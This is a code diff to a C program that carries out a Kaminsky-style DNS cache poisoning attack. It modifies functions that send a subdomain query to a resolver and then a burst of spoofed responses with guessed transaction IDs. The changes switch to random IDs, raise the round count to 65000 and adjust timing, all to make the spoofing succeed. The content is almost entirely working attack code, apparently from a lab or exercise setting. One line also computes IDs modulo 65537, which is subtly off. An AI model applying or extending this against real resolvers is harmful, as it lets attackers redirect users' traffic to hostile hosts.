@@ -414,11 +414,12 @@ int send_spoof_burst(const char *subdomain, int resolver_port, int budget) {
     inet_pton(AF_INET, RESOLVER_IP, &target_address.sin_addr);
 
     // Fix 1: Use int instead of uint16_t to avoid comparison warning
-    for (int txid = 0; txid < 65536 && packets_sent < budget; txid++) {
+    for (int index = 0; index < 20 && packets_sent < budget; index++) {
         uint8_t *dns_data = NULL;
         size_t dns_size = 0;
 
         // Fix 2: Cast int to uint16_t for the function call
+        int txid = rand() % 65537;
         int dns_created = create_kaminsky_response(&dns_data, &dns_size, (uint16_t)txid, subdomain);
         if (dns_created != 1 || dns_data == NULL) {
             continue;
@@ -482,6 +483,7 @@ int main(void) {
     send_first_request();
     sleep(1);
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    srand((unsigned int)time(NULL));
 
     int opt = 1;
     if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
@@ -514,7 +516,7 @@ int main(void) {
 
     const int MAX_SPOOFED = 20 * 65536;
     int total_spoofed = 0;
-    const int MAX_ROUNDS = 20;
+    const int MAX_ROUNDS = 65000;
 
     for (int round = 0; round < MAX_ROUNDS && total_spoofed < MAX_SPOOFED; round++) {
         char subdomain[256];
@@ -522,7 +524,7 @@ int main(void) {
         printf("[CLIENT] == ROUND %d, subdomain: %s ===\n", round, subdomain);
 
         send_subdomain_query(subdomain);
-
+        usleep(1);
         int budget = MAX_SPOOFED - total_spoofed;
         int sent_now = send_spoof_burst(subdomain, resolver_port, budget);
         total_spoofed = total_spoofed + sent_now;
